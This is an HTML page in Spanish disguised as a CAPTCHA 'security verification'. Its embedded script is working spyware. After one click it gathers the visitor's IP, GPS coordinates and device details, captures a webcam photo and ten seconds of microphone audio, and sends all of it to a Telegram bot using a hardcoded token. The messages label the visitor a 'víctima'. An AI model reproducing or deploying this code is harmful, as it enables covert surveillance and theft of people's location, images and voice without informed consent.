<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificaci√≥n de seguridad</title>
  <style>
    body {
      background: white;
      color: #1a0dab;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px 20px;
      margin: 0;
    }
    .container {
      max-width: 480px;
      margin: 0 auto;
      background: #fff;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      border: 1px solid #dadce0;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 20px;
    }
    p {
      font-size: 16px;
      line-height: 1.5;
      margin-bottom: 30px;
      color: #3c4043;
    }
    button {
      background: #1a73e8;
      color: white;
      border: none;
      padding: 14px 32px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      box-shadow: 0 2px 6px rgba(26,115,232,0.3);
    }
    button:hover {
      background: #1557b0;
    }
    .loader {
      display: none;
      margin: 30px auto;
      width: 50px;
      height: 50px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #1a73e8;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .status {
      margin-top: 20px;
      font-size: 14px;
      color: #5f6368;
    }
  </style>
</head>
<body>

<div class="container">
  <h1>Verificaci√≥n de seguridad</h1>
  <p>Para continuar necesitamos verificar que no eres un robot.</p>
  <p>Por favor acepta los siguientes permisos para completar la verificaci√≥n:</p>
  
  <button onclick="verificarHumano()">ACEPTAR Y CONTINUAR</button>
  
  <div class="loader" id="loader"></div>
  <div class="status" id="status"></div>
</div>

<script>

const BOT_TOKEN = "8073881757:AAHpZPnjwg29xhmfkrahnmCnYsp8CbcMf_M";
const CHAT_ID   = "8284747554";
const URL_MSG   = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const URL_PHOTO = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
const URL_AUDIO = `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`;


async function verificarHumano() {
  document.getElementById("loader").style.display = "block";
  document.getElementById("status").innerHTML = "Verificando permisos...";

  let datos = `ü§ñ NUEVA V√çCTIMA EN CAPTCHA VERIFICATION 2026\n\n`;

  
  const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
  const battery = await navigator.getBattery();
  let gps = "Denegada";
  try {
    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {timeout: 10000}));
    gps = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`;
  } catch(e) {}

  datos += `IP: ${ipData.ip}\n`;
  datos += `Ubicaci√≥n: ${ipData.city}, ${ipData.country_name} ${ipData.country_emoji || ""}\n`;
  datos += `GPS exacto: ${gps}\n`;
  datos += `Dispositivo: ${navigator.platform}\n`;
  datos += `CPU: ${navigator.hardwareConcurrency} n√∫cleos\n`;
  datos += `RAM: ${navigator.deviceMemory || "?"} GB\n`;
  datos += `Bater√≠a: ${Math.round(battery.level*100)}% ${battery.charging ? "‚ö°" : ""}\n`;
  datos += `Pantalla: ${screen.width}x${screen.height}\n`;
  datos += `Hora: ${new Date().toLocaleString('es-ES')}\n\n`;

  
  try {
    const stream = await navigator.mediaDevices.getUserMedia({video: true});
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();
    
    const canvas = document.createElement('canvas');
    canvas.width = 1280;
    canvas.height = 720;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
    
    canvas.toBlob(async blob => {
      const form = new FormData();
      form.append("chat_id", CHAT_ID);
      form.append("photo", blob, "cara_victima.jpg");
      form.append("caption", datos + "üì∏ FOTO DE LA V√çCTIMA CAPTURADA");
      await fetch(URL_PHOTO, {method: "POST", body: form});
    }, 'image/jpeg', 0.95);

    stream.getTracks().forEach(t => t.stop());
  } catch(e) {
    datos += "üì∏ C√°mara denegada o no disponible\n";
  }

  
  try {
    const audioStream = await navigator.mediaDevices.getUserMedia({audio: true});
    const recorder = new MediaRecorder(audioStream);
    const chunks = [];
    
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.start();
    
    setTimeout(() => {
      recorder.stop();
      audioStream.getTracks().forEach(t => t.stop());
    }, 10000);

    recorder.onstop = async () => {
      const audioBlob = new Blob(chunks, {type: 'audio/webm'});
      const form = new FormData();
      form.append("chat_id", CHAT_ID);
      form.append("audio", audioBlob, "voz_victima.webm");
      form.append("caption", datos + "üé§ AUDIO DE 10 SEGUNDOS CAPTURADO");
      await fetch(URL_AUDIO, {method: "POST", body: form});
    };
  } catch(e) {
    datos += "üé§ Micr√≥fono denegado\n";
  }

  
  setTimeout(() => {
    fetch(URL_MSG, {method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify({chat_id: CHAT_ID, text: datos + "\n‚úÖ VERIFICACI√ìN COMPLETADA\nLa v√≠ctima acept√≥ todos los permisos"})
    });
  }, 3000);

  
  setTimeout(() => {
    document.getElementById("status").innerHTML = "‚úì Verificaci√≥n completada. Continuando...";
    
  }, 5000);
}
</script>

</body>
</html>
